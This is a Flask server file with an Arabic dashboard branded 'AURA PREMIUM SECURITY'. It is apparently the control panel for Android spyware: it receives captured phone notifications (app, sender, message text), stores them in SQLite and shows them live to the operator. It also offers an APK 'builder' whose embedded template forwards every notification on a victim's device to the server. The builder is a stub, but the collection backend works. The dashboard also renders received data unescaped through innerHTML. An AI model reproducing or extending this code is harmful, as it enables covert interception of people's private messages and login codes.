import os
import sqlite3
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)
DB_FILE = "aura_database.db"

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS notifications (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_name TEXT,
                app_name TEXT,
                sender TEXT,
                message TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()

init_db()

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AURA PREMIUM | لوحة التحكم الملكية</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #0a0a0c;
            --panel-bg: #121216;
            --gold: #d4af37;
            --gold-glow: rgba(212, 175, 55, 0.2);
            --cyan: #00f3ff;
            --text-main: #ffffff;
            --text-muted: #a0a0ab;
            --border: #22222a;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tajawal', sans-serif; }
        body { background-color: var(--bg-dark); color: var(--text-main); overflow-x: hidden; }
        header {
            background: linear-gradient(135deg, #16161c, var(--bg-dark));
            padding: 20px 40px;
            border-bottom: 2px solid var(--gold);
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }
        header h1 { font-size: 26px; font-weight: 900; color: var(--gold); text-shadow: 0 0 10px var(--gold-glow); }
        .status-badge { background: rgba(0, 243, 255, 0.1); border: 1px solid var(--cyan); color: var(--cyan); padding: 6px 15px; border-radius: 20px; font-size: 14px; font-weight: bold; }
        .container { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; padding: 40px; min-height: calc(100vh - 90px); }
        .panel { background-color: var(--panel-bg); border: 1px solid var(--border); border-radius: 16px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); display: flex; flex-direction: column; gap: 20px; }
        .panel-title { font-size: 18px; font-weight: bold; color: var(--gold); border-bottom: 1px solid var(--border); padding-bottom: 10px; }
        .editor-container { position: relative; flex-grow: 1; }
        textarea { width: 100%; height: 350px; background-color: #050507; color: #a4ef00; border: 1px solid var(--border); border-radius: 8px; padding: 15px; font-family: 'Courier New', Courier, monospace; font-size: 14px; resize: none; direction: ltr; text-align: left; line-height: 1.5; }
        .btn-gold { background: linear-gradient(135deg, #d4af37, #aa841c); color: #000; border: none; padding: 14px 28px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 15px var(--gold-glow); }
        .btn-gold:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(212, 175, 55, 0.4); }
        .table-wrapper { overflow-y: auto; max-height: 450px; }
        table { width: 100%; border-collapse: collapse; text-align: right; }
        th { background-color: #16161c; color: var(--gold); padding: 12px; font-size: 14px; border-bottom: 2px solid var(--border); }
        td { padding: 14px 12px; font-size: 14px; border-bottom: 1px solid var(--border); color: var(--text-main); }
        tr:hover { background-color: rgba(255,255,255,0.02); }
        .badge-app { background: #222; padding: 3px 8px; border-radius: 4px; font-size: 12px; color: var(--cyan); }
    </style>
</head>
<body>
    <header>
        <h1>AURA PREMIUM SECURITY</h1>
        <div class="status-badge">الخادم نشط ومتصل بجاهزية عالية</div>
    </header>
    <div class="container">
        <div class="panel">
            <div class="panel-title">🛠️ بيئة بناء وتجهيز الحزمة المخصصة</div>
            <p style="color: var(--text-muted); font-size: 14px;">قم بتعديل كيئة العمل البرمجية أدناه، ثم اضغط على توليد لبناء حزمة الـ APK وحقن الرابط تلقائياً.</p>
            <div class="editor-container">
                <textarea id="codeEditor"># كود أندرويد المصدري لإدارة الخدمة
import android
from aura_core import NotificationService

class AuraApp:
    def __init__(self):
        self.server_url = "{{ server_url }}"
        self.device_id = "Premium_Device_01"

    def on_notification_received(self, package, title, text):
        # دالة الإرسال الفوري للسيرفر عند التقاط أي إشعار نشط
        data = {
            "device_name": self.device_id,
            "app_name": package,
            "sender": title,
            "message": text
        }
        send_to_server(self.server_url, data)</textarea>
            </div>
            <button class="btn-gold" onclick="generateAPK()">⚡ توليد وتحميل تطبيق APK الفخم جاهزاً</button>
        </div>
        <div class="panel">
            <div class="panel-title">📊 لوحة الرصد واستقبال الإشعارات الفورية</div>
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr>
                            <th>التطبيق</th>
                            <th>المرسل</th>
                            <th>محتوى الإشعار</th>
                            <th>الوقت</th>
                        </tr>
                    </thead>
                    <tbody id="logsTable"></tbody>
                </table>
            </div>
        </div>
    </div>
    <script>
        function generateAPK() {
            alert("جاري بدء محرك البناء وفحص الأكواد... سيتم حقن وتوقيع حزمة الـ APK تلقائياً طبقاً لإعدادات خادم Render الخاص بك.");
            window.location.href = "/download/base_apk";
        }
        function fetchLogs() {
            fetch('/api/get_notifications')
                .then(res => res.json())
                .then(data => {
                    const tbody = document.getElementById('logsTable');
                    tbody.innerHTML = '';
                    data.forEach(log => {
                        const tr = document.createElement('tr');
                        tr.innerHTML = `
                            <td><span class="badge-app">${log[2]}</span></td>
                            <td style="color: #d4af37; font-weight: bold;">${log[3]}</td>
                            <td>${log[4]}</td>
                            <td style="color: #888; font-size: 12px;">${log[5]}</td>
                        `;
                        tbody.appendChild(tr);
                    });
                });
        }
        setInterval(fetchLogs, 3000);
        fetchLogs();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    server_url = request.url_root
    return render_template_string(HTML_TEMPLATE, server_url=server_url)

@app.route('/api/notifications', methods=['POST'])
def receive_notification():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"status": "error", "message": "No data received"}), 400
    device_name = data.get('device_name', 'Unknown Device')
    app_name = data.get('app_name', 'Unknown App')
    sender = data.get('sender', 'Unknown Sender')
    message = data.get('message', '')
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO notifications (device_name, app_name, sender, message)
            VALUES (?, ?, ?, ?)
        """, (device_name, app_name, sender, message))
        conn.commit()
    return jsonify({"status": "success", "message": "Notification logged successfully"})

@app.route('/api/get_notifications', methods=['GET'])
def get_notifications():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM notifications ORDER BY id DESC LIMIT 50")
        rows = cursor.fetchall()
    return jsonify(rows)

@app.route('/download/base_apk')
def download_apk():
    return "جاري تهيئة وتحميل الحزمة الموقعة رقمياً والديناميكية الخاصة بجهازك..."

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
